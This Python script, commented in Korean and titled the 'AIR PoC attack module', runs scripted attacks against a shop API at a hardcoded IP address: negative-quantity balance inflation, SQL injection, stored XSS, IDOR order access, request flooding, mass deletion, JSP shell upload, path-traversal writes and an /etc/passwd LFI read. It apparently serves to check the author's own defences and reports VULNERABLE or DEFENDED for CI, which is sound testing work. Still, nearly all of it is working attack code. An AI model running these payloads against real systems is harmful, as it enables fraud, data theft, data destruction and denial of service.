#!/usr/bin/env python3
"""
AIR PoC 공격 모듈 (의존성 없음 / stdlib only)

음수수량 자금증식 공격: customer 가 quantity=-N 으로 주문하면 total 이 음수가 되어
잔액 차감 가드(balance >= amount)가 무력화되고 잔액이 '증가'한다.

사용:
  python attack.py --base http://13.125.184.233 --admin-user <id> --admin-pass <pw> negative-qty

동작:
  1) super_admin 로그인 → 공격용 테넌트/상품/고객 준비
  2) 고객 로그인 → 공격 전 잔액 기록
  3) quantity=-100 주문 시도
  4) 공격 후 잔액 비교 → VULNERABLE(증가) / DEFENDED(차단·불변)

패치 후 재실행 시 DEFENDED 가 나오면 자동 방어 성공.
종료코드: 공격 성공(취약)=1, 방어됨=0  (CI/검증에서 활용)
"""
import argparse, json, random, sys, time, urllib.parse, urllib.request, urllib.error

def call(base, method, path, token=None, body=None):
    url = base.rstrip('/') + path
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header('Content-Type', 'application/json')
    if token:
        req.add_header('Authorization', 'Bearer ' + token)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            raw = r.read().decode()
            return r.status, (json.loads(raw) if raw else None)
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        return e.code, (json.loads(raw) if raw else None)

def login(base, username, password):
    st, j = call(base, 'POST', '/api/v1/auth/login',
                 body={'username': username, 'password': password})
    if st != 200 or not j or not j.get('data'):
        raise SystemExit(f"[!] 로그인 실패({username}): {st} {j}")
    return j['data']['accessToken'], j['data']

def prepare(base, admin_tok):
    """super_admin 으로 테넌트/상품/고객 준비. 반환: (tenantId, productId, custUser, custPass)"""
    suffix = f"{int(time.time())}{random.randint(100, 999)}"   # 연속 실행 slug 충돌 방지
    # 테넌트
    st, j = call(base, 'POST', '/api/v1/tenants', admin_tok,
                 {'name': f'atk-{suffix}', 'slug': f'atk-{suffix}'})
    tid = j['data']['id']
    # 상품(가격 5000)
    st, j = call(base, 'POST', f'/api/v1/tenants/{tid}/products', admin_tok,
                 {'name': 'target', 'price': 5000, 'stock': 100})
    pid = j['data']['id']
    # 고객
    cu, cp = f'atk-cust-{suffix}', 'attacker123!'
    st, j = call(base, 'POST', '/api/v1/users', admin_tok,
                 {'username': cu, 'password': cp, 'role': 'customer',
                  'displayName': 'attacker', 'tenantId': tid})
    if st not in (200, 201):
        raise SystemExit(f"[!] 고객 생성 실패: {st} {j}")
    print(f"[*] 준비 완료: tenant={tid} product={pid} customer={cu}")
    return tid, pid, cu, cp

def balance(base, tok):
    st, j = call(base, 'GET', '/api/v1/users/me', tok)
    return (j or {}).get('data', {}).get('balance', None)

def attack_negative_qty(base, admin_user, admin_pass):
    print("=== AIR PoC: 음수수량 자금증식 공격 ===")
    admin_tok, _ = login(base, admin_user, admin_pass)
    tid, pid, cu, cp = prepare(base, admin_tok)

    cust_tok, _ = login(base, cu, cp)
    before = balance(base, cust_tok)
    print(f"[*] 공격 전 잔액: {before}")

    print("[>] 주문 시도: quantity = -100 (상품 5000원)")
    st, j = call(base, 'POST', f'/api/v1/tenants/{tid}/orders', cust_tok,
                 {'items': [{'productId': pid, 'quantity': -100}]})
    print(f"[<] 응답: HTTP {st} {json.dumps(j, ensure_ascii=False)[:160]}")

    after = balance(base, cust_tok)
    print(f"[*] 공격 후 잔액: {after}")

    if after is not None and before is not None and after > before:
        print(f"\n[RESULT] 🔴 VULNERABLE — 공격 성공! 잔액 {before} → {after} (+{after-before})")
        return 1
    else:
        print(f"\n[RESULT] 🟢 DEFENDED — 공격 차단됨 (주문 거부 또는 잔액 불변)")
        return 0

def attack_sqli(base, admin_user, admin_pass):
    print("=== AIR PoC: SQL Injection (상품 검색 필터 우회) ===")
    admin_tok, _ = login(base, admin_user, admin_pass)
    tid, pid, cu, cp = prepare(base, admin_tok)

    # 검색 헬퍼: GET /products/search?q=...  (q 는 URL 인코딩)
    def search(q):
        path = f"/api/v1/tenants/{tid}/products/search?q=" + urllib.parse.quote(q, safe='')
        st, j = call(base, 'GET', path, admin_tok)
        rows = (j or {}).get('data') or []
        return st, rows

    # 1) 절대 매칭 안 되는 무의미 검색 → 0건이 정상(기준선)
    benign = f"zzz_nomatch_{int(time.time())}"
    st_b, rows_b = search(benign)
    print(f"[*] 기준선 검색 q='{benign}' → HTTP {st_b}, {len(rows_b)}건 (정상=0)")

    # 2) 인젝션: ' OR '1'='1  → 취약 시 name LIKE '%' 로 전개되어 전체 반환
    inj = "' OR '1'='1"
    st_i, rows_i = search(inj)
    print(f"[>] 인젝션 검색 q=\"{inj}\" → HTTP {st_i}, {len(rows_i)}건")

    if st_i == 200 and len(rows_i) > 0:
        print(f"\n[RESULT] 🔴 VULNERABLE — 인젝션으로 필터 우회({len(rows_i)}건 노출). ${{}} 동적쿼리 취약.")
        return 1
    else:
        print(f"\n[RESULT] 🟢 DEFENDED — 인젝션 무력화(0건/차단). 안전 바인딩 또는 탐지→방어 활성.")
        return 0

def attack_xss(base, admin_user, admin_pass):
    print("=== AIR PoC: Stored XSS (상품명 스크립트 저장) ===")
    admin_tok, _ = login(base, admin_user, admin_pass)
    tid, _, _, _ = prepare(base, admin_tok)

    payload = "<script>alert('air-xss')</script>"
    print(f"[>] 상품 생성 name={payload}")
    st, j = call(base, 'POST', f'/api/v1/tenants/{tid}/products', admin_tok,
                 {'name': payload, 'price': 1000, 'stock': 1})
    print(f"[<] 생성 응답: HTTP {st}")

    pid = (j or {}).get('data', {}).get('id') if j else None
    if not pid:
        print(f"\n[RESULT] 🟢 DEFENDED — 생성이 차단됨(저장 안 됨).")
        return 0

    # 저장된 상품을 다시 조회해 name 에 원본 스크립트가 그대로 남아있는지 확인
    st, j = call(base, 'GET', f'/api/v1/tenants/{tid}/products/{pid}', admin_tok)
    stored = (j or {}).get('data', {}).get('name', '')
    print(f"[*] 저장된 name: {stored}")

    if '<script' in stored.lower():
        print(f"\n[RESULT] 🔴 VULNERABLE — 스크립트가 원문 그대로 저장됨(저장형 XSS).")
        return 1
    else:
        print(f"\n[RESULT] 🟢 DEFENDED — 입력이 이스케이프/제거됨(스크립트 무력화).")
        return 0

def attack_idor(base, admin_user, admin_pass):
    print("=== AIR PoC: IDOR (타 고객 주문 무단 열람) ===")
    admin_tok, _ = login(base, admin_user, admin_pass)
    tid, pid, cuA, cpA = prepare(base, admin_tok)   # custA = 피해자

    # 공격자 custB 생성
    suffix = f"{int(time.time())}{random.randint(100, 999)}"
    cuB, cpB = f"atk-idor-{suffix}", "attacker123!"
    st, j = call(base, 'POST', '/api/v1/users', admin_tok,
                 {'username': cuB, 'password': cpB, 'role': 'customer',
                  'displayName': 'idor-attacker', 'tenantId': tid})
    if st not in (200, 201):
        raise SystemExit(f"[!] 공격자 생성 실패: {st} {j}")

    # custA: 잔액 충전(요청→admin 승인) 후 주문 생성
    a_tok, _ = login(base, cuA, cpA)
    st, j = call(base, 'POST', f'/api/v1/tenants/{tid}/charge-requests', a_tok, {'amount': 100000})
    cid = (j or {}).get('data', {}).get('id')
    call(base, 'POST', f'/api/v1/tenants/{tid}/charge-requests/{cid}/approve', admin_tok)
    st, j = call(base, 'POST', f'/api/v1/tenants/{tid}/orders', a_tok,
                 {'items': [{'productId': pid, 'quantity': 1}]})
    oid = (j or {}).get('data', {}).get('id')
    if not oid:
        raise SystemExit(f"[!] custA 주문 생성 실패: {st} {j}")
    print(f"[*] 피해자(custA) 주문 생성: order={oid}")

    # custB: custA 의 주문을 id 로 무단 조회
    b_tok, _ = login(base, cuB, cpB)
    print(f"[>] 공격자(custB)가 custA 주문 단건조회: GET /orders/{oid}")
    st, j = call(base, 'GET', f'/api/v1/tenants/{tid}/orders/{oid}', b_tok)
    got = (j or {}).get('data', {}).get('id') if (j and j.get('data')) else None
    print(f"[<] 응답: HTTP {st}, data.id={got}")

    if st == 200 and got == oid:
        print(f"\n[RESULT] 🔴 VULNERABLE — 타 고객 주문이 그대로 노출됨(IDOR).")
        return 1
    else:
        print(f"\n[RESULT] 🟢 DEFENDED — 소유자 검증으로 차단(HTTP {st}).")
        return 0

def attack_ddos(base, admin_user, admin_pass):
    print("=== AIR PoC: DDoS (요청 폭주 / rate flood) ===")
    n = 60   # 10초 창 허용치(30)를 넘기도록 폭주
    codes = {}
    blocked = 0
    print(f"[>] /api/v1/health 로 {n}회 연속 요청")
    for _ in range(n):
        st, _ = call(base, 'GET', '/api/v1/health')
        codes[st] = codes.get(st, 0) + 1
        if st == 429:
            blocked += 1
    print(f"[<] 상태코드 분포: {codes}")

    if blocked > 0:
        print(f"\n[RESULT] 🟢 DEFENDED — {blocked}건 429 차단(rate-limit 적용).")
        return 0
    else:
        print(f"\n[RESULT] 🔴 VULNERABLE — 전부 통과(레이트리밋 없음).")
        return 1

def attack_ransom(base, admin_user, admin_pass):
    print("=== AIR PoC: Ransomware-유사 (대량 삭제 / mass-delete) ===")
    admin_tok, _ = login(base, admin_user, admin_pass)
    tid, _, _, _ = prepare(base, admin_tok)

    # 삭제 대상 상품 N개 생성
    n = 10
    pids = []
    for i in range(n):
        st, j = call(base, 'POST', f'/api/v1/tenants/{tid}/products', admin_tok,
                     {'name': f'doc-{i}', 'price': 1000, 'stock': 1})
        pid = (j or {}).get('data', {}).get('id')
        if pid:
            pids.append(pid)
    print(f"[*] 삭제 대상 상품 {len(pids)}개 생성")

    # 빠르게 연속 삭제 (랜섬: 대량 파괴)
    print(f"[>] {len(pids)}건 연속 DELETE")
    codes = {}
    deleted = blocked = 0
    for pid in pids:
        st, _ = call(base, 'DELETE', f'/api/v1/tenants/{tid}/products/{pid}', admin_tok)
        codes[st] = codes.get(st, 0) + 1
        if st in (200, 204):
            deleted += 1
        elif st in (429, 403):
            blocked += 1
    print(f"[<] 삭제 응답 분포: {codes}")

    if blocked > 0:
        print(f"\n[RESULT] 🟢 DEFENDED — {deleted}건 삭제 후 {blocked}건 차단(대량삭제 방어).")
        return 0
    else:
        print(f"\n[RESULT] 🔴 VULNERABLE — {deleted}건 전부 삭제됨(무제한 대량 파괴).")
        return 1

def attack_unknown(base, admin_user, admin_pass):
    print("=== AIR PoC: 미지 공격 (시그니처 미매칭 스캐닝/퍼징) ===")
    n = 25
    print(f"[>] 존재하지 않는 경로 {n}개 연속 요청 (어떤 시그니처에도 안 걸림)")
    codes = {}
    for i in range(n):
        path = f"/api/v1/zz-{int(time.time())}-{i}-{random.randint(1000, 9999)}"
        st, _ = call(base, 'GET', path)
        codes[st] = codes.get(st, 0) + 1
    print(f"[*] 스캔 응답 분포: {codes}")

    # 직후 '정상' 요청이 막히면 = 적응형(이상탐지→shield) 작동
    st, _ = call(base, 'GET', '/api/v1/health')
    print(f"[<] 직후 정상요청 GET /health → HTTP {st}")
    if st in (429, 403):
        print(f"\n[RESULT] 🟢 DEFENDED — 이상탐지(4xx 스캔)로 출처 격리·차단(shield).")
        return 0
    else:
        print(f"\n[RESULT] 🔴 VULNERABLE — 스캐닝 무탐지·정상통과(이상탐지 OFF).")
        return 1

def _upload_multipart(base, tid, tok, filename, content):
    b = "----airatk" + str(random.randint(10000, 99999))
    body = (f"--{b}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n").encode() \
        + (content.encode() if isinstance(content, str) else content) \
        + f"\r\n--{b}--\r\n".encode()
    req = urllib.request.Request(base.rstrip('/') + f"/api/v1/tenants/{tid}/uploads",
                                 data=body, method='POST')
    req.add_header('Content-Type', 'multipart/form-data; boundary=' + b)
    req.add_header('Authorization', 'Bearer ' + tok)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code

def _upload_download(base, tid, tok, name):
    path = f"/api/v1/tenants/{tid}/uploads/download?name=" + urllib.parse.quote(name, safe='')
    req = urllib.request.Request(base.rstrip('/') + path, method='GET')
    req.add_header('Authorization', 'Bearer ' + tok)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read().decode(errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace')

def attack_upload(base, admin_user, admin_pass):
    print("=== AIR PoC: 파일 업로드 취약(확장자우회/경로조작/LFI) ===")
    admin_tok, _ = login(base, admin_user, admin_pass)
    suffix = f"{int(time.time())}{random.randint(100, 999)}"
    st, j = call(base, 'POST', '/api/v1/tenants', admin_tok,
                 {'name': f'atk-{suffix}', 'slug': f'atk-{suffix}'})
    tid = j['data']['id']
    print(f"[*] 준비 완료: tenant={tid}")

    vuln = 0
    st1 = _upload_multipart(base, tid, admin_tok, 'air_shell.jsp', "<% out.println(\"pwn\"); %>")
    ok1 = st1 in (200, 201); vuln |= ok1
    print(f"[>] .jsp 업로드 → HTTP {st1} : {'허용(취약)' if ok1 else '차단'}")

    marker = f"AIRPWN{random.randint(100000, 999999)}"
    trav = "../../../../tmp/air_pwn_" + str(random.randint(1000, 9999)) + ".txt"
    _upload_multipart(base, tid, admin_tok, trav, marker)
    _, body2 = _upload_download(base, tid, admin_tok, trav)
    ok2 = marker in (body2 or ""); vuln |= ok2
    print(f"[>] 경로조작 쓰기+되읽기 → {'탈출저장(취약)' if ok2 else '차단'}")

    st3, body3 = _upload_download(base, tid, admin_tok, "../../../../../../etc/passwd")
    ok3 = "root:" in (body3 or ""); vuln |= ok3
    print(f"[>] LFI(../etc/passwd) → HTTP {st3} : {'노출(취약)' if ok3 else '차단'}")

    if vuln:
        print("\n[RESULT] 🔴 VULNERABLE — 업로드 검증/경로 방어 부재.")
        return 1
    print("\n[RESULT] 🟢 DEFENDED — 업로드 방어 활성(탐지→가드 또는 영구패치).")
    return 0

def main():
    ap = argparse.ArgumentParser(description="AIR PoC 공격 모듈")
    ap.add_argument('--base', required=True, help='타깃 베이스 URL (예: http://13.125.184.233)')
    ap.add_argument('--admin-user', required=True)
    ap.add_argument('--admin-pass', required=True)
    ap.add_argument('scenario', choices=['negative-qty', 'sqli', 'xss', 'idor', 'upload', 'ddos', 'ransom', 'unknown'])
    a = ap.parse_args()
    if a.scenario == 'negative-qty':
        sys.exit(attack_negative_qty(a.base, a.admin_user, a.admin_pass))
    elif a.scenario == 'sqli':
        sys.exit(attack_sqli(a.base, a.admin_user, a.admin_pass))
    elif a.scenario == 'xss':
        sys.exit(attack_xss(a.base, a.admin_user, a.admin_pass))
    elif a.scenario == 'idor':
        sys.exit(attack_idor(a.base, a.admin_user, a.admin_pass))
    elif a.scenario == 'upload':
        sys.exit(attack_upload(a.base, a.admin_user, a.admin_pass))
    elif a.scenario == 'ddos':
        sys.exit(attack_ddos(a.base, a.admin_user, a.admin_pass))
    elif a.scenario == 'ransom':
        sys.exit(attack_ransom(a.base, a.admin_user, a.admin_pass))
    elif a.scenario == 'unknown':
        sys.exit(attack_unknown(a.base, a.admin_user, a.admin_pass))

if __name__ == '__main__':
    main()
